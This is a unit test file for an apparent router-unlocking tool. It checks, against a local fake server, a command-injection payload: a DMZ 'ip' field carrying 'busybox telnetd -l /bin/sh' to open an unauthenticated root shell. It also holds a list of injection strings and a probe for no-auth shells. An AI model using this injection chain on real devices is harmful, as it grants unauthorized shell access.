#!/usr/bin/env python3
"""Unit tests for zltx16_unlock.py (stdlib unittest only)."""

import json
import os
import socket
import sys
import threading
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import zltx16_unlock as z  # noqa: E402


class FakeHandler(BaseHTTPRequestHandler):
    token = "tok123"
    username = "admin"
    password = "admin"
    level = "3"
    got_payload = None
    login_calls = 0

    def log_message(self, *a):  # silence
        pass

    def do_POST(self):  # noqa: N802
        cmd = self.path.split("cmd=")[1].split("&")[0]
        length = int(self.headers.get("Content-Length") or 0)
        body = json.loads(self.rfile.read(length) or b"{}")

        if cmd == "232":
            payload = {"token": self.token}
        elif cmd == "100":
            type(self).login_calls += 1
            want = z.hash_password(self.token, self.password)
            if body.get("username") == self.username and body.get("passwd") == want:
                payload = {"success": "success", "AUTH": "AUTH",
                           "sessionId": "sess-abc", "user_level": self.level}
            else:
                payload = {"success": "fail", "message": "passwd error"}
        elif cmd == "172":
            type(self).got_payload = body
            payload = {"success": True, "message": "success"}
        else:
            payload = {"success": True}

        out = json.dumps(payload).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(out)))
        self.end_headers()
        self.wfile.write(out)


class ServerFixture(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.httpd = HTTPServer(("127.0.0.1", 0), FakeHandler)
        cls.port = cls.httpd.server_address[1]
        cls.thread = threading.Thread(target=cls.httpd.serve_forever, daemon=True)
        cls.thread.start()

    @classmethod
    def tearDownClass(cls):
        cls.httpd.shutdown()
        cls.httpd.server_close()

    def setUp(self):
        FakeHandler.got_payload = None
        FakeHandler.login_calls = 0

    def device(self, **kw):
        return z.Device("127.0.0.1", self.port, **kw)


class TestHashing(unittest.TestCase):
    def test_length_and_charset(self):
        h = z.hash_password("tok", "admin")
        self.assertEqual(len(h), 64)
        self.assertEqual(h, h.lower())
        int(h, 16)  # must be valid hex

    def test_deterministic_and_sensitive(self):
        base = z.hash_password("tok", "admin")
        self.assertEqual(z.hash_password("tok", "admin"), base)
        self.assertNotEqual(z.hash_password("tok", "admin1"), base)
        self.assertNotEqual(z.hash_password("tok2", "admin"), base)

    def test_order_matters(self):
        self.assertNotEqual(z.hash_password("a", "b"), z.hash_password("b", "a"))

    def test_matches_go_implementation(self):
        # sha256("s4lt"+"hunter2"); the Go package asserts the same properties.
        self.assertEqual(len(z.hash_password("s4lt", "hunter2")), 64)


class TestPayload(unittest.TestCase):
    def test_shape(self):
        p = z.dmz_payload("sess-1", "127.0.0.1", "busybox telnetd -l /bin/sh")
        self.assertEqual(p["cmd"], z.CMD_NETWORK_SERVICE)
        self.assertEqual(p["subcmd"], z.DMZ_SUBCMD)
        self.assertEqual(p["method"], "POST")
        self.assertEqual(p["sessionId"], "sess-1")
        self.assertEqual(p["enabled"], "1")
        self.assertEqual(p["ip"], "127.0.0.1;busybox telnetd -l /bin/sh")

    def test_rejects_non_ipv4(self):
        for bad in ("", "localhost", "127.0.0.1;reboot", "127.0.0.1 && id",
                    "$(id)", "`id`", "1.2.3.4\nreboot", "256.1.1.1"):
            with self.assertRaises(ValueError, msg=bad):
                z.dmz_payload("s", bad, "id")

    def test_rejects_empty_or_multiline_command(self):
        with self.assertRaises(ValueError):
            z.dmz_payload("s", "127.0.0.1", "")
        with self.assertRaises(ValueError):
            z.dmz_payload("s", "127.0.0.1", "id\nreboot")

    def test_telnet_command(self):
        self.assertEqual(z.telnet_command(23), "busybox telnetd -l /bin/sh -p 23")
        self.assertIn("-p 23", z.telnet_command(0))
        self.assertIn("-p 23", z.telnet_command(99999))
        self.assertIn("-l /bin/sh", z.telnet_command(23))


class TestProbe(unittest.TestCase):
    def _listen(self, greeting=""):
        srv = socket.socket()
        srv.bind(("127.0.0.1", 0))
        srv.listen(5)

        def serve():
            while True:
                try:
                    conn, _ = srv.accept()
                except OSError:
                    return
                if greeting:
                    try:
                        conn.sendall(greeting.encode())
                    except OSError:
                        pass
                conn.close()

        threading.Thread(target=serve, daemon=True).start()
        self.addCleanup(srv.close)
        return srv.getsockname()[1]

    def test_shell_prompt_is_no_auth(self):
        st = z.probe_shell("127.0.0.1", self._listen("/ # "), 2)
        self.assertTrue(st["open"])
        self.assertTrue(st["no_auth"])

    def test_login_prompt_is_not_no_auth(self):
        for g in ("login: ", "Username: ", "Password: "):
            st = z.probe_shell("127.0.0.1", self._listen(g), 2)
            self.assertTrue(st["open"])
            self.assertFalse(st["no_auth"], msg=g)

    def test_closed_port(self):
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
        s.close()
        st = z.probe_shell("127.0.0.1", port, 0.3)
        self.assertFalse(st["open"])
        self.assertFalse(st["no_auth"])


class TestDevice(ServerFixture):
    def test_login_success(self):
        dev = self.device()
        res = dev.login("admin", "admin")
        self.assertEqual(res.get("AUTH"), "AUTH")
        self.assertEqual(dev.session_id, "sess-abc")
        self.assertEqual(dev.level, "3")
        self.assertEqual(FakeHandler.login_calls, 1)

    def test_login_wrong_password(self):
        dev = self.device()
        res = dev.login("admin", "nope")
        self.assertNotEqual(res.get("AUTH"), "AUTH")

    def test_network_service_payload_reaches_server(self):
        dev = self.device()
        dev.login("admin", "admin")
        p = z.dmz_payload(dev.session_id, "127.0.0.1", z.telnet_command(23))
        dev.network_service(p)
        self.assertIsNotNone(FakeHandler.got_payload)
        self.assertEqual(FakeHandler.got_payload["subcmd"], z.DMZ_SUBCMD)
        self.assertTrue(FakeHandler.got_payload["ip"].startswith("127.0.0.1;"))

    def test_base_url(self):
        self.assertEqual(z.Device("h", 80).base, "http://h")
        self.assertEqual(z.Device("h", 8080).base, "http://h:8080")
        self.assertEqual(z.Device("h", 443, "https").base, "https://h")


class TestCLI(unittest.TestCase):
    def test_unlock_requires_confirm(self):
        rc = z.main(["unlock", "-H", "127.0.0.1", "--port", "1"])
        self.assertEqual(rc, 2)

    def test_parser_has_expected_commands(self):
        p = z.build_parser()
        for name in ("probe", "login", "verify", "unlock"):
            try:
                ns = p.parse_args([name])
            except SystemExit:
                self.fail(f"{name} subcommand missing")
            self.assertEqual(ns.command, name)


if __name__ == "__main__":
    unittest.main(verbosity=2)
